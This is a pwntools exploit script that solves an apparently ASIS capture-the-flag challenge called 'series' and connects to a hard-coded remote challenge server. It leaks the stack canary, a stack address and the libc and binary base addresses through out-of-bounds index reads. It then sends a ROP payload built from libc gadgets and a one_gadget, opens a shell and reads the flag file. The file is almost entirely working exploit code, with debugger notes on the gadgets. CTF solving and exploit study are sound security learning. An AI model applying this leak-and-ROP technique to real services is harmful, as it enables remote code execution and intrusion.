#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./series.elf"
elf = context.binary
libc = ELF("./libc.so.6")
libc.sym['one_gadget'] = 0x4f322

def DEBUG():
    cmd = '''
    bpie 0xBF3
    bpie 0xD95
    c
    '''
    gdb.attach(io, cmd)
    sleep(0.5)

#  io = process("./series.elf")
io = remote("76.74.177.238", 9007)

io.sendafter("A = ", "0")
sleep(0.01)

io.sendafter("B = ", "1")
sleep(0.01)

#  DEBUG()
io.sendafter("n = ", str(0x30000 / 8))
#  io.sendafter("n = ", "0" * 24)
sleep(0.01)

io.sendafter("x0 = ", "3")
sleep(0.01)

io.sendafter("x1 = ", "4")
sleep(0.01)

io.sendafter("i > ", str(0x649b))
sleep(0.01)
io.recvuntil("x(25755) = ")
canary = int(io.recvline().strip())
print("canary @ {:#x}".format(canary))

io.sendafter("i > ", str(0x64f6))
io.recvuntil("x(25846) = ")
stack = int(io.recvline().strip())
print("stack @ {:#x}".format(stack))

io.sendafter("i > ", str(0x61fe))
io.recvuntil("x(25086) = ")
libc.address = int(io.recvline().strip())
print("libc @ {:#x}".format(libc.address))

#  sleep(2.5)
io.sendafter("i > ", str(0x62aa))
io.recvuntil("x(25258) = ")
elf.address = int(io.recvline().strip()) - 0x552
print("elf @ {:#x}".format(elf.address))

#  io.sendafter("i > ", flat("-1\0".ljust(8, '\0'), libc.sym['one_gadget'], libc.sym['one_gadget'], canary))
#  io.sendafter("i > ", flat("-1\0".ljust(8, '\0'), 'aaaaaaaa', 'bbbbbbbb', canary))
'''
pwndbg> x/3i 0x00000000001415c3+0x7f4295e5d000
   0x7f4295f9e5c3 <__deadline_from_timeval+83>:	mov    eax,edx
   0x7f4295f9e5c5 <__deadline_from_timeval+85>:	movsxd rdx,esi
   0x7f4295f9e5c8 <__deadline_from_timeval+88>:	ret
'''
'''
pwndbg> x/4i 0x000000000011007d+0x7f4295e5d000
   0x7f4295f6d07d <__GI___libc_read+13>:	xor    eax,eax
=> 0x7f4295f6d07f <__GI___libc_read+15>:	syscall
   0x7f4295f6d081 <__GI___libc_read+17>:	cmp    rax,0xfffffffffffff000
   0x7f4295f6d087 <__GI___libc_read+23>:	ja     0x7f4295f6d0e0 <__GI___libc_read+112>
'''
payload = flat(
        "-1\0".ljust(8, '\0'),
        libc.address + 0x00000000001415c3,
        libc.address + 0x000000000011007d,
        canary
        )

io.sendafter("i > ", payload)
#  io.sendlineafter(cyclic(n = 8, length = 0x200))
io.sendline(flat('\0' * 23, libc.sym['one_gadget'], '\0' * 0x100))

io.sendline("echo shell")
try:
    io.recvuntil("shell", timeout = 2)
    io.sendline("cat flag*")
    io.interactive()
except:
    io.close()

# ASIS{0n3_g4dg3t_st1ll_w0rks!}
